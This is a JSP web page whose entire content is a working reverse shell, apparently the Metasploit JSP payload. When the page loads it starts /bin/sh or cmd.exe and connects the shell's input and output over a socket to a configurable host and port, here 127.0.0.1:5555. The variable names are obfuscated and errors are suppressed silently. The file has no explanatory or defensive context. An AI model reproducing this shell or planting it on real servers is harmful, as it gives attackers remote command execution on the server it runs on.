<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wI;
    OutputStream r0;

    StreamConnector( InputStream wI, OutputStream r0 )
    {
      this.wI = wI;
      this.r0 = r0;
    }

    public void run()
    {
      BufferedReader yV  = null;
      BufferedWriter hD6 = null;
      try
      {
        yV  = new BufferedReader( new InputStreamReader( this.wI ) );
        hD6 = new BufferedWriter( new OutputStreamWriter( this.r0 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = yV.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hD6.write( buffer, 0, length );
          hD6.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( yV != null )
          yV.close();
        if( hD6 != null )
          hD6.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "127.0.0.1", 5555 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
